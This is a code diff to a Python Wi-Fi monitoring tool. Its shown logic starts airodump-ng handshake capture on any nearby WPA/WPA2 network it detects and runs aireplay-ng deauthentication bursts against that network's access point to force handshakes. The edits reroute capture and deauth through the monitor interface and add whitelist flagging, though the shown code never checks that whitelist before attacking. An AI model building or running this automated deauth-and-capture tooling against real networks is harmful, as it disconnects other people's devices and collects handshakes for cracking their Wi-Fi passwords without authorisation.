@@ -326,12 +326,19 @@ class WiFiMonitor:
                 network_id = self.db.add_network(ssid, bssid, channel, encryption, signal)
                 self.networks[bssid]['id'] = network_id
                 
+                # Set whitelist flag if this SSID is in whitelist
+                if ssid in self.whitelist_ssids:
+                    self.db.set_whitelist(bssid, True)
+                
                 logger.info(f"✓ Target network: {ssid} ({bssid}) on channel {channel} - {encryption}")
             else:
                 # Update existing network
                 self.networks[bssid]['last_seen'] = datetime.now()
                 self.networks[bssid]['signal'] = signal
                 self.networks[bssid]['channel'] = channel
+                self.networks[bssid]['encryption'] = encryption
+                # Update database too
+                self.db.add_network(ssid, bssid, channel, encryption, signal)
             
             # Start handshake capture if WPA/WPA2 and not already capturing
             if 'WPA' in encryption and bssid not in self.active_captures:
@@ -434,12 +441,9 @@ class WiFiMonitor:
             
             logger.info(f"⚡ Starting handshake capture for {ssid} ({bssid}) on channel {channel}")
             
-            # Test if attack interface is in monitor mode
-            result = subprocess.run(['iw', 'dev', self.attack_interface, 'info'],
-                                  capture_output=True, text=True)
-            if 'type monitor' not in result.stdout:
-                logger.error(f"{self.attack_interface} is not in monitor mode!")
-                return
+            # Use monitor interface for airodump since that's where we see the networks
+            # The monitor interface is already in monitor mode from packet sniffing
+            capture_interface = self.monitor_interface
             
             # Start airodump-ng to capture handshake
             cmd = [
@@ -448,7 +452,7 @@ class WiFiMonitor:
                 '--channel', str(channel),
                 '--write', capture_base,
                 '--output-format', 'cap',
-                self.attack_interface
+                capture_interface  # Use monitor interface instead of attack interface
             ]
             
             logger.debug(f"Running: {' '.join(cmd)}")
@@ -509,11 +513,14 @@ class WiFiMonitor:
             
             logger.info(f"💥 Sending deauth packets to {ssid} ({bssid})...")
             
-            # First, ensure attack interface is on the correct channel
+            # Use monitor interface for deauth too - same interface that sees the network
+            deauth_interface = self.monitor_interface
+            
+            # First, ensure monitor interface is on the correct channel (it might be hopping)
             try:
-                subprocess.run(['iw', 'dev', self.attack_interface, 'set', 'channel', str(channel)],
+                subprocess.run(['iw', 'dev', deauth_interface, 'set', 'channel', str(channel)],
                              capture_output=True, check=True, timeout=5)
-                logger.debug(f"Set {self.attack_interface} to channel {channel}")
+                logger.debug(f"Set {deauth_interface} to channel {channel}")
             except Exception as e:
                 logger.warning(f"Failed to set channel: {e}")
             
@@ -522,7 +529,7 @@ class WiFiMonitor:
                 'aireplay-ng',
                 '--deauth', '10',
                 '-a', bssid,
-                self.attack_interface
+                deauth_interface
             ], capture_output=True, text=True, timeout=30)
             
             if result.returncode == 0:
